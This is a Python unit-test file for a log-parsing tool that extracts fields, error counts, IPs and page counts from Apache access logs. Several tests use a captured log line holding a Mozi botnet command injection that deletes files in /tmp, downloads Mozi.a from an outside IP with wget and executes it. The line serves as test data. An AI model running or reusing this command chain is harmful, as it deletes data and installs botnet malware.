import unittest
from scripts.log_extract import log_tool

class TestStringMethods(unittest.TestCase):

    def test_parser1(self):
        lt=log_tool()
        template = '127.1.1.1 - - [09/Jan/2011:18:22:48 +0100] "GET / HTTP/1.1" 302 243 "-" "Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.04 (lucid) Firefox/3.6.13"'
        self.assertEqual(lt.log_parsing(template)['remote_host'], '127.1.1.1')  
        self.assertEqual(lt.log_parsing(template)['status'], '302')
        self.assertEqual(lt.log_parsing(template)['time_received'], '[09/Jan/2011:18:22:48 +0100]')
        self.assertEqual(lt.log_parsing(template)['request_method'], 'GET')

    def test_parser2(self):
        lt=log_tool()
        template= 'localhost:80 127.0.0.1 - - [11/Jan/2022:09:50:01 +0100] "GET /wp-cron.php HTTP/1.1" 200 131 "-" "Mozilla/5.0"'
        self.assertEqual(lt.log_parsing(template)['remote_logname'], '127.0.0.1')
        self.assertEqual(lt.log_parsing(template)['status'], '200')
        self.assertEqual(lt.log_parsing(template)['time_received'], '[11/Jan/2022:09:50:01 +0100]')
        self.assertEqual(lt.log_parsing(template)['request_method'], 'GET')

    def test_error_count(self):
        lt=log_tool()
        log1='localhost:80 125.44.54.120 - - [12/Jan/2022:10:31:54 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://125.44.54.120:42097/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 397 "-" "Hello, world"'
        log2='localhost:80 127.0.0.1 - - [12/Jan/2022:10:35:01 +0100] "GET /wp-cron.php HTTP/1.1" 200 131 "-" "Mozilla/5.0"'
        log3='localhost:80 185.180.143.10 - - [12/Jan/2022:10:38:11 +0100] "GET / HTTP/1.1" 200 3844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"'
        log4='localhost:80 185.180.143.10 - - [12/Jan/2022:10:38:11 +0100] "GET /public/img/mongo-express-logo.png HTTP/1.1" 404 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"'
        parsed_log1=lt.log_parsing(log1)
        parsed_log2=lt.log_parsing(log2)
        parsed_log3=lt.log_parsing(log3)
        parsed_log4=lt.log_parsing(log4)
        error_count=0
        error_count=error_count+lt.getError(parsed_log1['status'])
        error_count=error_count+lt.getError(parsed_log2['status'])
        error_count=error_count+lt.getError(parsed_log3['status'])
        error_count=error_count+lt.getError(parsed_log4['status'])
        self.assertEqual(error_count,2)

    def test_ipList(self):
        lt=log_tool()
        log1='localhost:80 125.44.54.120 - - [12/Jan/2022:10:31:54 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://125.44.54.120:42097/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 397 "-" "Hello, world"'
        log2='localhost:80 127.0.0.1 - - [12/Jan/2022:10:35:01 +0100] "GET /wp-cron.php HTTP/1.1" 200 131 "-" "Mozilla/5.0"'
        log3='localhost:80 185.180.143.10 - - [12/Jan/2022:10:38:11 +0100] "GET / HTTP/1.1" 200 3844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"'
        log4='localhost:80 185.180.143.10 - - [12/Jan/2022:10:38:11 +0100] "GET /public/img/mongo-express-logo.png HTTP/1.1" 404 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"'
        parsed_log1=lt.log_parsing(log1)
        parsed_log2=lt.log_parsing(log2)
        parsed_log3=lt.log_parsing(log3)
        parsed_log4=lt.log_parsing(log4)
        ip_list=[]
        lt.getIPlist("monitorme2.ddns.net","other_vhosts_access.log",parsed_log1,ip_list)
        lt.getIPlist("monitorme2.ddns.net","other_vhosts_access.log",parsed_log2,ip_list)
        lt.getIPlist("monitorme2.ddns.net","other_vhosts_access.log",parsed_log3,ip_list)
        lt.getIPlist("monitorme2.ddns.net","other_vhosts_access.log",parsed_log4,ip_list)
        self.assertEqual(len(ip_list),3)

    def test_pagelist(self):
        lt=log_tool()
        log1='localhost:80 125.44.54.120 - - [12/Jan/2022:10:31:54 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://125.44.54.120:42097/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 397 "-" "Hello, world"'
        log2='localhost:80 127.0.0.1 - - [12/Jan/2022:10:35:01 +0100] "GET /wp-cron.php HTTP/1.1" 200 131 "-" "Mozilla/5.0"'
        log3='localhost:80 185.180.143.10 - - [12/Jan/2022:10:38:11 +0100] "GET / HTTP/1.1" 200 3844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"'
        log4='localhost:80 185.180.143.10 - - [12/Jan/2022:10:38:11 +0100] "GET /public/img/mongo-express-logo.png HTTP/1.1" 404 341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"'
        parsed_log1=lt.log_parsing(log1)
        parsed_log2=lt.log_parsing(log2)
        parsed_log3=lt.log_parsing(log3)
        parsed_log4=lt.log_parsing(log4)
        page_list=[]
        count_page_list=[]
        diff_page_list=[]
        lt.initpageLists(parsed_log1,diff_page_list,count_page_list)
        lt.initpageLists(parsed_log2,diff_page_list,count_page_list)
        lt.initpageLists(parsed_log3,diff_page_list,count_page_list)
        lt.initpageLists(parsed_log4,diff_page_list,count_page_list)
        page_list=lt.getPageLists(count_page_list,diff_page_list)
        output=[["GET /shell?cd+/tmp;rm+-rf+*;wget+http://125.44.54.120:42097/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1",1],["GET /wp-cron.php HTTP/1.1",1],["GET / HTTP/1.1",1],["GET /public/img/mongo-express-logo.png HTTP/1.1",1]]
        print("page list  ",page_list)
        self.assertEqual(output[0], page_list[0])


if __name__ == '__main__':
    unittest.main()
